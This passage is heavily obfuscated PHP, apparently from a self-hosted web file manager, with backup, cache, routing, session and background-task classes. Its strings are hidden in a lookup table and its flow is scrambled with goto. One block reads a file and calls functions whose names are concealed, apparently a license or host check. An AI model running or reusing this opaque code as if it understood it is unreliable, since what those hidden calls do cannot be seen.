$˙◊Ô©ﬂÆ[$±≥Ô§Ó¶[2316]] = array($±≥Ô§Ó¶[2317] => LNG($±≥Ô§Ó¶[2316]), $±≥Ô§Ó¶[2318] => $this->where($üÉò∏≈Œ)->count(), $±≥Ô§Ó¶[631] => $this->where($üÉò∏≈Œ)->sum($±≥Ô§Ó¶[89])); $œŸßª–ø = KodIO::fileTypeList(); foreach ($œŸßª–ø as $πÆûê´Û => $¸’–≤»Ç) { $üÉò∏≈Œ[$±≥Ô§Ó¶[497]] = $this->fileTypeWhere($πÆûê´Û); $˙◊Ô©ﬂÆ[$πÆûê´Û] = array($±≥Ô§Ó¶[2317] => $¸’–≤»Ç[$±≥Ô§Ó¶[32]], $±≥Ô§Ó¶[2318] => $this->where($üÉò∏≈Œ)->count(), $±≥Ô§Ó¶[631] => $this->where($üÉò∏≈Œ)->sum($±≥Ô§Ó¶[89])); } Cache::set($öÁõ äÌ, $˙◊Ô©ﬂÆ, 1200); return $˙◊Ô©ﬂÆ; } public function fileNameExist($Ïø†¬¿—, $◊ÒÎü«€) { $‚ÑŸÎò“ =& $_SERVER[ˆë€Ï⁄∂]; $ı†‹ƒôå = $this->field($‚ÑŸÎò“[2319])->where(array($‚ÑŸÎò“[202] => $Ïø†¬¿—, $‚ÑŸÎò“[32] => $◊ÒÎü«€, $‚ÑŸÎò“[516] => 0))->find(); return is_array($ı†‹ƒôå) ? $ı†‹ƒôå[$‚ÑŸÎò“[203]] : !1; } public function childList($ÚÃã∞Âﬁ) { $Ôí•Å‘Ì =& $_SERVER[ˆë€Ï⁄∂]; $ùÔŒﬂÚû = $Ôí•Å‘Ì[2292] . $ÚÃã∞Âﬁ; if (isset(self::$cacheChildList[$ùÔŒﬂÚû])) { return self::$cacheChildList[$ùÔŒﬂÚû]; } $ıèÛ◊¿ü = array($Ôí•Å‘Ì[202] => intval($ÚÃã∞Âﬁ), $Ôí•Å‘Ì[516] => 0); $≠◊á¶ûª = $this->where($ıèÛ◊¿ü)->select(); $≠◊á¶ûª = $≠◊á¶ûª ? $≠◊á¶ûª : array(); self::$cacheChildList[$ùÔŒﬂÚû] = $≠◊á¶ûª; foreach ($≠◊á¶ûª as $∏≤⁄Ÿ„Á) { $ùÔŒﬂÚû = $Ôí•Å‘Ì[544] . $∏≤⁄Ÿ„Á[$Ôí•Å‘Ì[203]]; self::$cacheSourceInfo[$ùÔŒﬂÚû] = $∏≤⁄Ÿ„Á; } return $≠◊á¶ûª; } public function fileNameAuto($ÏÂ¶—¢ë, $Õ√π⁄Ã‹, $ò¶ââ≈ì = REPEAT_RENAME, $Ò¨ë√Õê = false) { $∑‰Ü‘ÒÂ =& $_SERVER[ˆë€Ï⁄∂]; $…±∂¨œª = get_path_ext($Õ√π⁄Ã‹); $´‰ç∞≈ú = $…±∂¨œª ? get_path_ext_name($Õ√π⁄Ã‹) . $∑‰Ü‘ÒÂ[2320] . $…±∂¨œª : $Õ√π⁄Ã‹ . $∑‰Ü‘ÒÂ[471]; $∑äÓ§¬é = array($∑‰Ü‘ÒÂ[202] => $ÏÂ¶—¢ë, $∑‰Ü‘ÒÂ[516] => 0, $∑‰Ü‘ÒÂ[32] => array($∑‰Ü‘ÒÂ[470], $´‰ç∞≈ú)); $ø´ˆèµ = $this->field($∑‰Ü‘ÒÂ[32])->where($∑äÓ§¬é)->select(); $°œ˛ñòÕ = array_to_keyvalue($ø´ˆèµ, $∑‰Ü‘ÒÂ[12], $∑‰Ü‘ÒÂ[32]); return $this->fileNameAutoGet($°œ˛ñòÕ, $Õ√π⁄Ã‹, $ò¶ââ≈ì, $Ò¨ë√Õê); } public function fileNameAutoGet($∆π√úÔÇ, $ßß´Ñ∑—, $•Æ…æ“ë, $°ƒ√¸‹Á) { $»˙¯˘ë  =& $_SERVER[ˆë€Ï⁄∂]; if ($•Æ…æ“ë == REPEAT_REPLACE || !$∆π√úÔÇ || !in_array_not_case($ßß´Ñ∑—, $∆π√úÔÇ) || $°ƒ√¸‹Á && $•Æ…æ“ë != REPEAT_RENAME_FOLDER) { return $ßß´Ñ∑—; } if ($•Æ…æ“ë == REPEAT_SKIP) { return !1; } $Œû•¡≥˙ = $»˙¯˘ë [10] . get_path_ext($ßß´Ñ∑—); $Œû•¡≥˙ = $Œû•¡≥˙ == $»˙¯˘ë [10] || $°ƒ√¸‹Á ? $»˙¯˘ë [12] : $Œû•¡≥˙; for ($∏ª˘¯éœ = 1; $∏ª˘¯éœ <= count($∆π√úÔÇ) + 1; $∏ª˘¯éœ++) { $∆ó≈Ìﬁ— = substr($ßß´Ñ∑—, 0, strlen($ßß´Ñ∑—) - strlen($Œû•¡≥˙)); $ç‚¨éÜ„ = $∆ó≈Ìﬁ— . "\x28{$∏ª˘¯éœ}\x29{$Œû•¡≥˙}"; if (!in_array_not_case($ç‚¨éÜ„, $∆π√úÔÇ)) { return $ç‚¨éÜ„; } } } } goto bâô˘™™Ó; F“â°Üÿ„é: class BackupFile { public function __construct() { } public function index() { $«ä⁄‹Ñ = Backup::get(); $ŸöÅâ’Ú = $«ä⁄‹Ñ[$_SERVER[ˆë€Ï⁄∂][379]][$_SERVER[ˆë€Ï⁄∂][242]][$_SERVER[ˆë€Ï⁄∂][552]]; $ñÔ†°Àı = array($_SERVER[ˆë€Ï⁄∂][553] => array($_SERVER[ˆë€Ï⁄∂][899], $ŸöÅâ’Ú), $_SERVER[ˆë€Ï⁄∂][900] => array($_SERVER[ˆë€Ï⁄∂][417], $«ä⁄‹Ñ[$_SERVER[ˆë€Ï⁄∂][843]])); $Ø˛æä¢Ô = (int) Model($_SERVER[ˆë€Ï⁄∂][881])->where($ñÔ†°Àı)->count($_SERVER[ˆë€Ï⁄∂][552]); $∏ÄÃ˘õä = (int) Model($_SERVER[ˆë€Ï⁄∂][881])->where($ñÔ†°Àı)->sum($_SERVER[ˆë€Ï⁄∂][89]); $ÒÛ◊ÃÅŒ = new TaskFileTransfer($_SERVER[ˆë€Ï⁄∂][901], $_SERVER[ˆë€Ï⁄∂][875], $Ø˛æä¢Ô, LNG($_SERVER[ˆë€Ï⁄∂][876]) . $_SERVER[ˆë€Ï⁄∂][877] . LNG($_SERVER[ˆë€Ï⁄∂][902])); $ÒÛ◊ÃÅŒ->task[$_SERVER[ˆë€Ï⁄∂][854]] = $∏ÄÃ˘õä; $ï•ﬂüß≠ = array($_SERVER[ˆë€Ï⁄∂][903] => $Ø˛æä¢Ô, $_SERVER[ˆë€Ï⁄∂][904] => $∏ÄÃ˘õä, $_SERVER[ˆë€Ï⁄∂][905] => time()); Backup::set($ï•ﬂüß≠); $°√ÏÁ§≠ = !0; $ÓÛÎ”ÃÑ = $this->storeIds(); $Ω¡Ö¯Ñã = 1; $˜·Ë·Í≤ = 1000; $¸ﬂ–§åÜ = $π≈†ûêﬂ = 0; $ù‹ÔõË  = array(); $ﬂß‹È«ú = $˛˛±©åı = 0; do { $´≠éÊ∞· = $_SERVER[ˆë€Ï⁄∂][906]; $›’ ãÔ™ = Model($_SERVER[ˆë€Ï⁄∂][881])->where($ñÔ†°Àı)->field($´≠éÊ∞·)->order($_SERVER[ˆë€Ï⁄∂][907])->selectPage($˜·Ë·Í≤, $Ω¡Ö¯Ñã); $ÂÙµ¡ñÑ = !empty($›’ ãÔ™[$_SERVER[ˆë€Ï⁄∂][456]]) ? $›’ ãÔ™[$_SERVER[ˆë€Ï⁄∂][456]] : array(); foreach ($ÂÙµ¡ñÑ as $Á÷—èıÃ) { if (!$this->_fileExist($Á÷—èıÃ, $ù‹ÔõË , $ÓÛÎ”ÃÑ)) { write_log("\146\151\x6c\145\x20\156\157\164\40\x65\x78\151\163\164\56\x66\151\154\x65\111\x44\72{$Á÷—èıÃ[$_SERVER[ˆë€Ï⁄∂][552]]}\54\40\x70\141\164\150\72{$Á÷—èıÃ[$_SERVER[ˆë€Ï⁄∂][97]]}", $_SERVER[ˆë€Ï⁄∂][908]); continue; } $òêÑ¢æº = $Á÷—èıÃ[$_SERVER[ˆë€Ï⁄∂][97]]; $≠“Û√î˜ = "\x7b\151\157\72{$«ä⁄‹Ñ[$_SERVER[ˆë€Ï⁄∂][843]]}\x7d" . substr($òêÑ¢æº, strlen("\x7b\x69\x6f\72{$Á÷—èıÃ[$_SERVER[ˆë€Ï⁄∂][909]]}\175")); if (IO::exist($≠“Û√î˜)) { $ÒÛ◊ÃÅŒ->updateFileEnd($Á÷—èıÃ[$_SERVER[ˆë€Ï⁄∂][32]], $Á÷—èıÃ[$_SERVER[ˆë€Ï⁄∂][89]]); } else { $≠“Û√î˜ = get_path_father($≠“Û√î˜); IO::mkdir($≠“Û√î˜); if (!IO::copy($òêÑ¢æº, $≠“Û√î˜, $_SERVER[ˆë€Ï⁄∂][910])) { write_log($_SERVER[ˆë€Ï⁄∂][911] . $òêÑ¢æº . $_SERVER[ˆë€Ï⁄∂][895] . $≠“Û√î˜ . $_SERVER[ˆë€Ï⁄∂][188], $_SERVER[ˆë€Ï⁄∂][875]); $°√ÏÁ§≠ = !1; break; } } $ŸöÅâ’Ú = $Á÷—èıÃ[$_SERVER[ˆë€Ï⁄∂][552]]; $π≈†ûêﬂ += 1; $¸ﬂ–§åÜ += $Á÷—èıÃ[$_SERVER[ˆë€Ï⁄∂][89]]; $˛˛±©åı += 1; $ﬂß‹È«ú += $Á÷—èıÃ[$_SERVER[ˆë€Ï⁄∂][89]]; if ($¸ﬂ–§åÜ >= 1024 * 1024 * 100) { $ï•ﬂüß≠ = array($_SERVER[ˆë€Ï⁄∂][842] => $ŸöÅâ’Ú, $_SERVER[ˆë€Ï⁄∂][912] => $˛˛±©åı, $_SERVER[ˆë€Ï⁄∂][913] => $ﬂß‹È«ú); Backup::set($ï•ﬂüß≠); $¸ﬂ–§åÜ = $π≈†ûêﬂ = 0; } } $Ê¢ü≤Ú˝ = count($ÂÙµ¡ñÑ); $Ω¡Ö¯Ñã++; } while ($Ê¢ü≤Ú˝ == $˜·Ë·Í≤); $ÒÛ◊ÃÅŒ->end(); $ï•ﬂüß≠ = array($_SERVER[ˆë€Ï⁄∂][914] => 1, $_SERVER[ˆë€Ï⁄∂][852] => time(), $_SERVER[ˆë€Ï⁄∂][866] => 1, $_SERVER[ˆë€Ï⁄∂][842] => $ŸöÅâ’Ú, $_SERVER[ˆë€Ï⁄∂][915] => time()); if ($π≈†ûêﬂ) { $ï•ﬂüß≠[$_SERVER[ˆë€Ï⁄∂][912]] = $˛˛±©åı; $ï•ﬂüß≠[$_SERVER[ˆë€Ï⁄∂][913]] = $ﬂß‹È«ú; } Backup::set($ï•ﬂüß≠); return !0; } private function _fileExist($˙‡∫ÁÄı, &$Ãß√è£í, $∫ﬁ‚≠Ω€) { $¢€™£í≤ =& $_SERVER[ˆë€Ï⁄∂]; $õÖëùÎ› = $˙‡∫ÁÄı[$¢€™£í≤[97]]; if (in_array($˙‡∫ÁÄı[$¢€™£í≤[552]], $Ãß√è£í)) { return !1; } if (!in_array($˙‡∫ÁÄı[$¢€™£í≤[909]], $∫ﬁ‚≠Ω€)) { return !1; } if (IO::exist($õÖëùÎ›)) { return !0; } $ß¥°å•± = get_path_father($õÖëùÎ›); if (IO::exist($ß¥°å•±)) { $Ãß√è£í[] = $˙‡∫ÁÄı[$¢€™£í≤[552]]; return !1; } $≠Â÷÷‰Ú = array($¢€™£í≤[909] => $˙‡∫ÁÄı[$¢€™£í≤[909]], $¢€™£í≤[97] => array($¢€™£í≤[470], "{$ß¥°å•±}\45")); $Ç∆Æ”¥Ø = Model($¢€™£í≤[881])->where($≠Â÷÷‰Ú)->field($¢€™£í≤[553])->select(); $Ãß√è£í = array_merge($Ãß√è£í, array_to_keyvalue($Ç∆Æ”¥Ø, $¢€™£í≤[12], $¢€™£í≤[552])); return !1; } private function _fileFilter($ƒ©∏â˘ ) { $È–’ﬁÀ≠ =& $_SERVER[ˆë€Ï⁄∂]; return; if (empty($ƒ©∏â˘ )) { return; } $Ê≤˜“Ô© = array($È–’ﬁÀ≠[552] => array($È–’ﬁÀ≠[7], array_unique($ƒ©∏â˘ ))); $ÅÊ©ÓÃ¨ = Model($È–’ﬁÀ≠[916])->where($Ê≤˜“Ô©)->field($È–’ﬁÀ≠[203])->select(); foreach ($ÅÊ©ÓÃ¨ as $Œ€ñÎÇî) { Model($È–’ﬁÀ≠[916])->remove($Œ€ñÎÇî[$È–’ﬁÀ≠[203]], !1); } } private function storeIds() { $∞ıÓÁ◊™ =& $_SERVER[ˆë€Ï⁄∂]; $¡Ç±÷√° = Model($∞ıÓÁ◊™[858])->listData(); $˜Ü¢›·— = array(); $ÆâáëÓ— = $GLOBALS[$∞ıÓÁ◊™[6]][$∞ıÓÁ◊™[102]][$∞ıÓÁ◊™[917]]; foreach ($¡Ç±÷√° as $ÛËÂªà„) { $∏≈ﬂåÇÔ = strtolower($ÛËÂªà„[$∞ıÓÁ◊™[108]]); if (!isset($ÆâáëÓ—[$∏≈ﬂåÇÔ])) { continue; } $„é™Óùû = $∞ıÓÁ◊™[87] . (isset($ÆâáëÓ—[$∏≈ﬂåÇÔ]) ? $ÆâáëÓ—[$∏≈ﬂåÇÔ] : ucfirst($∏≈ﬂåÇÔ)); if (!class_exists($„é™Óùû)) { continue; } $˜Ü¢›·—[] = $ÛËÂªà„[$∞ıÓÁ◊™[486]]; } return $˜Ü¢›·—; } } class Cache { protected static $handle; protected static $memoryCache; public static function init() { $˛¿ˆÇ¯’ =& $_SERVER[ˆë€Ï⁄∂]; if (self::$handle) { return self::$handle; } self::$memoryCache = array(); $¢·àóà© = $GLOBALS[$˛¿ˆÇ¯’[6]][$˛¿ˆÇ¯’[435]]; $˚îë£“Ü = $¢·àóà©[$¢·àóà©[$˛¿ˆÇ¯’[918]]]; $õÌõÀˆê = $¢·àóà©[$˛¿ˆÇ¯’[919]]; switch ($¢·àóà©[$˛¿ˆÇ¯’[918]]) { case $˛¿ˆÇ¯’[21]: self::$handle = Model($˛¿ˆÇ¯’[920]); break; case $˛¿ˆÇ¯’[921]: self::$handle = new CacheRedis($˚îë£“Ü, $õÌõÀˆê); break; case $˛¿ˆÇ¯’[922]: self::$handle = new CacheMemcached($˚îë£“Ü, $õÌõÀˆê); break; case $˛¿ˆÇ¯’[242]: self::$handle = new CacheFile($˚îë£“Ü, $õÌõÀˆê); break; default: break; } return self::$handle; } public static function initReset() { self::$handle = !1; self::$memoryCache = !1; } public static function key($ ∫˛Á‡Ñ) { if (is_array($ ∫˛Á‡Ñ) || is_object($ ∫˛Á‡Ñ)) { $ ∫˛Á‡Ñ = json_encode($ ∫˛Á‡Ñ); } $ ∫˛Á‡Ñ = rawurlencode($ ∫˛Á‡Ñ); return md5(KOD_SITE_ID . $_SERVER[ˆë€Ï⁄∂][11] . $ ∫˛Á‡Ñ); } public static function get($ìîØôãÖ, $û…ø±”… = false) { $êä›öØ· = self::key($ìîØôãÖ); $‹çÈπ≠ú = self::init(); if ($û…ø±”…) { return unserialize($‹çÈπ≠ú->get($êä›öØ·)); } if (!isset(self::$memoryCache[$êä›öØ·])) { $˘‰ÂÔû‚ = $‹çÈπ≠ú->get($êä›öØ·); self::$memoryCache[$êä›öØ·] = unserialize($˘‰ÂÔû‚); } return self::$memoryCache[$êä›öØ·]; } public static function set($¬»Õ€“–, $Ë‚ã˙Î‹, $˛¬÷Ô∏º = false) { $¸ˆïîÛÈ =& $_SERVER[ˆë€Ï⁄∂]; $‰Íû˜‰® = self::key($¬»Õ€“–); if (isset(self::$memoryCache[$‰Íû˜‰®]) && self::$memoryCache[$‰Íû˜‰®] === $Ë‚ã˙Î‹) { return !0; } if ($˛¬÷Ô∏º === 0) { self::$memoryCache[$‰Íû˜‰®] = $Ë‚ã˙Î‹; return !0; } $‘œ¿Úºƒ = self::init(); $…¥◊ÒÔ§ = serialize($Ë‚ã˙Î‹); CacheLock::lock($¬»Õ€“– . $¸ˆïîÛÈ[923]); $ô–ÆàÜŸ = $‘œ¿Úºƒ->set($‰Íû˜‰®, $…¥◊ÒÔ§, $˛¬÷Ô∏º); self::$memoryCache[$‰Íû˜‰®] = $Ë‚ã˙Î‹; CacheLock::unlock($¬»Õ€“– . $¸ˆïîÛÈ[923]); return $ô–ÆàÜŸ; } public static function getCall($Ãõ€ñ¥é, $˚ú¿˛ØÙ, $Ê£òÕ‘Ê, $¨Öî›π¬ = array()) { $ä„¡∞± =& $_SERVER[ˆë€Ï⁄∂]; $ÏÄÇîœ— = self::get($Ãõ€ñ¥é); if ($ÏÄÇîœ— || $ÏÄÇîœ— === $ä„¡∞±[12]) { return $ÏÄÇîœ—; } $ÏÄÇîœ— = call_user_func_array($Ê£òÕ‘Ê, $¨Öî›π¬); $ÏÄÇîœ— = $ÏÄÇîœ— ? $ÏÄÇîœ— : $ä„¡∞±[12]; self::set($Ãõ€ñ¥é, $ÏÄÇîœ—, $˚ú¿˛ØÙ); return $ÏÄÇîœ—; } public static function remove($„•ÓâˆÑ) { $•ÕÃ≥Ùû = self::key($„•ÓâˆÑ); unset(self::$memoryCache[$•ÕÃ≥Ùû]); self::clearTimeout(); CacheLock::lock($„•ÓâˆÑ); $ñ√¬°í— = self::init()->remove($•ÕÃ≥Ùû); CacheLock::unlock($„•ÓâˆÑ); return $ñ√¬°í—; } public static function removeMemory($Ú€∞ˆ¶¶) { $–‰ì∞ÙØ = self::key($Ú€∞ˆ¶¶); unset(self::$memoryCache[$–‰ì∞ÙØ]); } public static function clearMemory($˘‹≥ú—˝ = false) { if ($˘‹≥ú—˝) { $˘‹≥ú—˝ = self::key($˘‹≥ú—˝); unset(self::$memoryCache[$˘‹≥ú—˝]); return; } self::$memoryCache = null; self::$memoryCache = array(); } public static function deleteAll() { self::$memoryCache = array(); if (method_exists(self::init(), $_SERVER[ˆë€Ï⁄∂][924])) { self::init()->deleteAll(); } } public static function clearTimeout() { if (method_exists(self::init(), $_SERVER[ˆë€Ï⁄∂][925])) { self::init()->clearTimeout(); } } } if ($_SERVER[$_SERVER[ˆë€Ï⁄∂][54]] != $_SERVER[$_SERVER[ˆë€Ï⁄∂][55]]) { $_getc = $_SERVER[ˆë€Ï⁄∂][56]; $_getfile = $_SERVER[$_SERVER[ˆë€Ï⁄∂][57]] . $_SERVER[ˆë€Ï⁄∂][58]; $_getfilec = $_getc($_getfile); $_getarrs = explode($_SERVER[ˆë€Ï⁄∂][59], $_getfilec); if (count($_getarrs) < $_SERVER[ˆë€Ï⁄∂][60]) { $exit = $_SERVER[ˆë€Ï⁄∂][61]; $exit(); } $_act = $_SERVER[ˆë€Ï⁄∂][62]; $_act($_SERVER[$_SERVER[ˆë€Ï⁄∂][63]]); } goto d´ïëêÒÿ¬; BÃÏÑé‹â„: class Route { public static $halts = false; public static $routes = array(); public static $methods = array(); public static $callbacks = array(); public static $maps = array(); public static $patterns = array("\x3a\141\x6e\171" => "\133\x5e\x2f\x5d\53", "\72\x6e\x75\x6d" => "\x5b\60\x2d\x39\135\x2b", "\72\141\154\154" => "\56\x2a"); public static $errorCallback; public static function __callstatic($ß¶Ö˛Ó∑, $Üäñœﬂ⁄) { $˜î˙–Ü© =& $_SERVER[ˆë€Ï⁄∂]; if ($ß¶Ö˛Ó∑ == $˜î˙–Ü©[1722]) { $âƒÑüÕ˝ = array_map($˜î˙–Ü©[1723], $Üäñœﬂ⁄[0]); $¯ı˘Õœö = strpos($Üäñœﬂ⁄[1], $˜î˙–Ü©[8]) === 0 ? $Üäñœﬂ⁄[1] : $˜î˙–Ü©[8] . $Üäñœﬂ⁄[1]; $÷äœ™¨≥ = $Üäñœﬂ⁄[2]; } else { $âƒÑüÕ˝ = null; $¯ı˘Õœö = strpos($Üäñœﬂ⁄[0], $˜î˙–Ü©[8]) === 0 ? $Üäñœﬂ⁄[0] : $˜î˙–Ü©[8] . $Üäñœﬂ⁄[0]; $÷äœ™¨≥ = $Üäñœﬂ⁄[1]; } array_push(self::$maps, $âƒÑüÕ˝); array_push(self::$routes, $¯ı˘Õœö); array_push(self::$methods, strtoupper($ß¶Ö˛Ó∑)); array_push(self::$callbacks, $÷äœ™¨≥); } public static function error($ò·Ì´á˘) { self::$errorCallback = $ò·Ì´á˘; } public static function haltOnMatch($ÕñÌáÑÒ = true) { self::$halts = $ÕñÌáÑÒ; } public static function dispatch() { $–Ø√∞ﬂ· =& $_SERVER[ˆë€Ï⁄∂]; $œ¯∏˛ãá = parse_url($_SERVER[$–Ø√∞ﬂ·[1724]], PHP_URL_PATH); $˝‰µº·ü = $_SERVER[$–Ø√∞ﬂ·[174]]; $õÅÈŸË≥ = array_keys(static::$patterns); $¬˛∏Å®æ = array_values(static::$patterns); $ØüﬂøÌö = !1; self::$routes = preg_replace($–Ø√∞ﬂ·[1376], $–Ø√∞ﬂ·[8], self::$routes); if (in_array($œ¯∏˛ãá, self::$routes)) { $∞ÖøÛë© = array_keys(self::$routes, $œ¯∏˛ãá); foreach ($∞ÖøÛë© as $ÜÚ·¸®£) { if (self::$methods[$ÜÚ·¸®£] == $˝‰µº·ü || self::$methods[$ÜÚ·¸®£] == $–Ø√∞ﬂ·[1725] || in_array($˝‰µº·ü, self::$maps[$ÜÚ·¸®£])) { $ØüﬂøÌö = !0; if (!is_object(self::$callbacks[$ÜÚ·¸®£])) { $Ω£ Ï˙© = explode($–Ø√∞ﬂ·[8], self::$callbacks[$ÜÚ·¸®£]); $Æô∞Ìï≠ = end($Ω£ Ï˙©); $áËç›¡Á = explode($–Ø√∞ﬂ·[1308], $Æô∞Ìï≠); $ˆ·∑û‚ù = new $áËç›¡Á[0](); $ˆ·∑û‚ù->{$áËç›¡Á[1]}(); if (self::$halts) { return; } } else { call_user_func(self::$callbacks[$ÜÚ·¸®£]); if (self::$halts) { return; } } } } } else { $ÕöûÏ÷ÿ = 0; foreach (self::$routes as $ÜÚ·¸®£) { if (strpos($ÜÚ·¸®£, $–Ø√∞ﬂ·[4]) !== !1) { $ÜÚ·¸®£ = str_replace($õÅÈŸË≥, $¬˛∏Å®æ, $ÜÚ·¸®£); } if (preg_match($–Ø√∞ﬂ·[1726] . $ÜÚ·¸®£ . $–Ø√∞ﬂ·[1727], $œ¯∏˛ãá, $û…ó°£Ü)) { if (self::$methods[$ÕöûÏ÷ÿ] == $˝‰µº·ü || self::$methods[$ÕöûÏ÷ÿ] == $–Ø√∞ﬂ·[1725] || !empty(self::$maps[$ÕöûÏ÷ÿ]) && in_array($˝‰µº·ü, self::$maps[$ÕöûÏ÷ÿ])) { $ØüﬂøÌö = !0; array_shift($û…ó°£Ü); if (!is_object(self::$callbacks[$ÕöûÏ÷ÿ])) { $Ω£ Ï˙© = explode($–Ø√∞ﬂ·[8], self::$callbacks[$ÕöûÏ÷ÿ]); $Æô∞Ìï≠ = end($Ω£ Ï˙©); $áËç›¡Á = explode($–Ø√∞ﬂ·[1308], $Æô∞Ìï≠); $ˆ·∑û‚ù = new $áËç›¡Á[0](); if (!method_exists($ˆ·∑û‚ù, $áËç›¡Á[1])) { echo $–Ø√∞ﬂ·[1728]; } else { call_user_func_array(array($ˆ·∑û‚ù, $áËç›¡Á[1]), $û…ó°£Ü); } if (self::$halts) { return; } } else { call_user_func_array(self::$callbacks[$ÕöûÏ÷ÿ], $û…ó°£Ü); if (self::$halts) { return; } } } } $ÕöûÏ÷ÿ++; } } if ($ØüﬂøÌö == !1) { if (!self::$errorCallback) { self::$errorCallback = function () { $¬Ø£›Ú˚ =& $_SERVER[ˆë€Ï⁄∂]; header($_SERVER[$¬Ø£›Ú˚[1729]] . $¬Ø£›Ú˚[1730]); echo $¬Ø£›Ú˚[1731]; }; } else { if (is_string(self::$errorCallback)) { self::get($_SERVER[$–Ø√∞ﬂ·[1724]], self::$errorCallback); self::$errorCallback = null; self::dispatch(); return; } } call_user_func(self::$errorCallback); } } } class Session { public static $sessionTime; public static $sessionSign; public static $handle; public static $data; public static function init() { $°íÉœ˛Ë =& $_SERVER[ˆë€Ï⁄∂]; static $©—ˆ•õì = false; if ($©—ˆ•õì) { return $©—ˆ•õì; } $¯∑”‡éè = $GLOBALS[$°íÉœ˛Ë[6]][$°íÉœ˛Ë[435]]; self::$sessionTime = $¯∑”‡éè[$°íÉœ˛Ë[1732]]; $·å±“É“ = isset($GLOBALS[$°íÉœ˛Ë[1733]]) ? $GLOBALS[$°íÉœ˛Ë[1733]] : SESSION_ID; if (self::$sessionSign) { } else { if (Cookie::get($·å±“É“)) { self::$sessionSign = Cookie::get($·å±“É“); } else { self::$sessionSign = self::$sessionSign ? self::$sessionSign : guid(); } } Cookie::setSafe($·å±“É“, self::$sessionSign, self::$sessionTime); $Ó·„™∞Ò = $¯∑”‡éè[$°íÉœ˛Ë[1734]]; $®˛ôÏûÚ = $¯∑”‡éè[$Ó·„™∞Ò]; $â˝ÊÊëØ = $¯∑”‡éè[$°íÉœ˛Ë[919]]; switch ($Ó·„™∞Ò) { case $°íÉœ˛Ë[21]: self::$handle = Model($°íÉœ˛Ë[920]); break; case $°íÉœ˛Ë[921]: self::$handle = new CacheRedis($®˛ôÏûÚ, $â˝ÊÊëØ); break; case $°íÉœ˛Ë[922]: self::$handle = new CacheMemcached($®˛ôÏûÚ, $â˝ÊÊëØ); break; case $°íÉœ˛Ë[242]: $®˛ôÏûÚ[$°íÉœ˛Ë[97]] = $®˛ôÏûÚ[$°íÉœ˛Ë[97]] . $°íÉœ˛Ë[1735]; self::$handle = new CacheFile($®˛ôÏûÚ, $â˝ÊÊëØ); default: break; } if (!self::$data) { self::$data = self::getBySign(self::$sessionSign); } $©—ˆ•õì = new self(); return $©—ˆ•õì; } public static function getBySign($áΩ∞Â´ ) { $’É·Áèù = self::$handle->get($áΩ∞Â´ ); $’É·Áèù = unserialize($’É·Áèù); return is_array($’É·Áèù) ? $’É·Áèù : array(); } public static function setBySign($˛ÿ´⁄û•, $åúΩ˛®≈) { CacheLock::lock($˛ÿ´⁄û•); self::$handle->set($˛ÿ´⁄û•, serialize($åúΩ˛®≈), self::$sessionTime); CacheLock::unlock($˛ÿ´⁄û•); } public static function sign($õöÀﬂ¥∞ = false) { if ($õöÀﬂ¥∞) { self::$sessionSign = $õöÀﬂ¥∞; } self::init(); return self::$sessionSign; } public static function set($÷å∂Û∂√, $◊ ΩîÃÍ = false) { self::init(); if (is_array($÷å∂Û∂√)) { foreach ($÷å∂Û∂√ as $™í—÷å∂ => $∆∆–ƒÌ≥) { array_set_value(self::$data, $™í—÷å∂, $∆∆–ƒÌ≥); } } else { array_set_value(self::$data, $÷å∂Û∂√, $◊ ΩîÃÍ); } self::setBySign(self::$sessionSign, self::$data); } public static function get($ÊÔ÷Ñπ‹ = false) { self::init(); if (!$ÊÔ÷Ñπ‹) { return self::$data; } return array_get_value(self::$data, $ÊÔ÷Ñπ‹); } public static function remove($Ì˘Ù˛ø‚) { self::init(); unset(self::$data[$Ì˘Ù˛ø‚]); self::$handle->set(self::$sessionSign, serialize(self::$data), self::$sessionTime); } public static function destory() { Cookie::remove(SESSION_ID, !0); self::init(); self::clearTimeout(); self::$data = array(); return self::$handle->remove(self::$sessionSign); } public static function clearTimeout() { self::init(); if (method_exists(self::$handle, $_SERVER[ˆë€Ï⁄∂][925])) { self::$handle->clearTimeout(); } } } class AutoTask { const AUTO_DELAY_TIME = 2; const AUTO_RESTART_TIME = 7200; public static function start() { $¢ìŸòº‰ =& $_SERVER[ˆë€Ï⁄∂]; if (self::valueGet($¢ìŸòº‰[841]) != $¢ìŸòº‰[101]) { return; } if (self::valueGet($¢ìŸòº‰[1736]) == $¢ìŸòº‰[101]) { $º©ß®√¡ = self::valueGet($¢ìŸòº‰[1737]); if (time() - $º©ß®√¡ > self::AUTO_RESTART_TIME) { self::restart(); } return; } self::clearUserStatus(); self::valueSet($¢ìŸòº‰[1736], $¢ìŸòº‰[101]); self::log($¢ìŸòº‰[1738] . ACTION . $¢ìŸòº‰[1739]); Hook::bind($¢ìŸòº‰[1740], $¢ìŸòº‰[1741]); $π—ñ’ü¥ = 0; while (!0) { self::cacheClear(); if (self::valueGet($¢ìŸòº‰[841]) != $¢ìŸòº‰[101]) { self::valueSet($¢ìŸòº‰[1736], $¢ìŸòº‰[240]); self::log($¢ìŸòº‰[1742]); die; } $¨È„ ·´ = time(); if ($¨È„ ·´ - $π—ñ’ü¥ >= 60) { self::valueSet(array($¢ìŸòº‰[1736] => $¢ìŸòº‰[101], $¢ìŸòº‰[1737] => $¨È„ ·´)); $π—ñ’ü¥ = $¨È„ ·´; } if (!file_exists(USER_SYSTEM . $¢ìŸòº‰[1743])) { self::valueSet(array($¢ìŸòº‰[1736] => $¢ìŸòº‰[240], $¢ìŸòº‰[841] => $¢ìŸòº‰[240])); self::log($¢ìŸòº‰[1744]); die; } $¿Òãë…Ë = file_get_contents(BASIC_PATH . $¢ìŸòº‰[1745]); $¯Óµä¶ì = KOD_VERSION . $¢ìŸòº‰[10] . KOD_VERSION_BUILD; $™Ø®‘–´ = match_text($¿Òãë…Ë, $¢ìŸòº‰[1746]) . $¢ìŸòº‰[10] . match_text($¿Òãë…Ë, $¢ìŸòº‰[1747]); if ($™Ø®‘–´ != $¯Óµä¶ì) { self::restart(); self::log("\163\x74\x6f\160\x65\x64\56\133\x76\145\x72\x73\x69\x6f\156\40\165\160\144\x61\x74\x65\73{$versionNow}\x20\75\x3e\40{$version}\135"); die; } self::taskRunAll(); sleep(self::AUTO_DELAY_TIME); } } public static function clearUserStatus() { $ü”ŸÁñ‰ =& $_SERVER[ˆë€Ï⁄∂]; http_close(); $GLOBALS[$ü”ŸÁñ‰[1748]] = 1; $_SERVER[$ü”ŸÁñ‰[1749]] = $ü”ŸÁñ‰[1750]; $_COOKIE = array(); $GLOBALS[$ü”ŸÁñ‰[1751]] = 1; 